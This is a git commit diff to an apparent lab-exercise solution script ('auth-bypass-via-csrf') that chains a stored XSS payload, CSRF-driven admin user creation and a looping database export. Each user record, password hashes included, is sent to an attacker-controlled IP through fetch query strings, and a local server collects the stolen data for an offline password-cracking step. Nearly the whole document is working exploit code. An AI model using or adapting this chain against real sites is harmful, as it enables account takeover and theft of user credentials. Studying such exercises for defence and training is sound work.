c3d7c5b92ef4a633daaa5e88473aeb304169f9a1
zinhart <aromzinhartdegraca@gmail.com>
2023-02-25 16:31:22 -0800

    Finally a step forward with setinterval for the password hash extraction.

--- answers/auth-bypass-via-csrf/create-admin-usr-auth-bypass.ps1
+++ answers/auth-bypass-via-csrf/create-admin-usr-auth-bypass.ps1
@@ -22,10 +22,24 @@ let config = {
 // Create an Admin user and seed values to crack the users password
 doRequest(``http://`${host_ip}/admin/users/create``, config);
 
+
+// Export the DataBase
+config = {
+  "method":"GET",
+  "credentials":"include",
+  mode: "cors",
+  headers: {
+        "Content-Type": "application/xml"
+  },
+};
+setInterval(() => {
+  extractHash(``http://`${host_ip}/admin/export``, config);
+}, 100);
+
 // Helper Functions
 // very basic
 function doRequest(endpoint, cfg) {
-  return fetch(endpoint, cfg).then(async (response) => {
+  fetch(endpoint, cfg).then(async (response) => {
       fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
         mode: "cors",
       });   
@@ -39,7 +53,35 @@ function doRequest(endpoint, cfg) {
       });
     }
   }).catch((error) => {
-       fetch(``http://`${attacker_ip}/?error=`` + error, {
+      fetch(``http://`${attacker_ip}/?error=`` + error, {
+        mode: "cors",
+      });   
+  });
+}
+
+// extract hash
+function extractHash(endpoint, cfg) {
+  fetch(endpoint, cfg).then(async (response) => {
+      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
+      mode: "cors",
+      });   
+      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
+      mode: "cors",
+      });
+    if(response.status < 400) {
+      let xml_string = await response.text();
+      let parser = new DOMParser();
+      let xmlDoc = parser.parseFromString(xml_string,"text/xml");
+      let users = xmlDoc.getElementsByTagName("user");
+      let hash='';
+      for(let i = 0; i < users.length; ++i) {
+        fetch(``http://`${attacker_ip}/?exfil=user_dump&value=`` + xmlDoc.getElementsByTagName("user")[i].innerHTML, {
+          mode: "cors",
+        });
+      }
+  }
+  }).catch((error) => {
+      fetch(``http://`${attacker_ip}/?error=`` + error, {
         mode: "cors",
       });   
   });
@@ -50,11 +92,49 @@ $xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.Name)'></scr
 Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"
 
 $start_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
-Write-Output "Sleeping for 30 seconds, start simulation";
-Start-Sleep -Seconds 30;
-$end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
-Remove-Item -Path $csrf_payload.Name;
-Write-Output $start_time;
-Write-Output $end_time;
+$end_time = '';
+Write-Output "Webserver Started, Start simulation";
 
-## get export of database from
+
+# Start cors server and wait for exfile data
+$server_job = Start-Job -ScriptBlock { python3 ./simple-cors-http-server.py 80 }
+$server_logs = '';
+$queryParams = @()
+while($True) {
+  $server_logs = Receive-Job -Job $server_job -Keep *>&1;
+  $magic_string = $server_logs | Select-String -Pattern 'zinhart';
+  # sls -Pattern '(\?exfil=hash&value=[^\s]+)'
+  if($magic_string.Matches.Length -gt 0) {
+    $match = $server_logs | Select-String -Pattern '(\?exfil=hash&value=[^\s]+)';
+    $match.Matches.value
+    <#
+    $ParsedQueryString = [System.Web.HttpUtility]::ParseQueryString($match.Matches.value)
+    $i = 0
+    foreach($QueryStringObject in $ParsedQueryString){
+        $queryObject = New-Object -TypeName psobject
+        $queryObject | Add-Member -MemberType NoteProperty -Name Query -Value $QueryStringObject
+        #$queryObject | Add-Member -MemberType NoteProperty -Name Value -Value $ParsedQueryString[$i];# ParseQueryString transforms + into a whitespace character, which cucks us
+        $queryObject | Add-Member -MemberType NoteProperty -Name Value -Value $($ParsedQueryString[$i] -replace ' ','+');
+        $queryParams += $queryObject
+        $i++
+    }
+    #>
+    #$queryParams
+    $end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
+    break;
+  }
+}
+
+
+## run password cracker
+<#
+javac PasswordCracker.java;
+java PasswordCracker.java "$start_time" "$end_time" "$($queryParams.value)"
+#>
+$server_logs
+Write-Output $start_time $end_time $queryParams.value;
+
+# cleanup
+Remove-Job -Job $server_job -Force;
+Remove-Item -Path $csrf_payload.Name;
+Remove-Item '*.class';
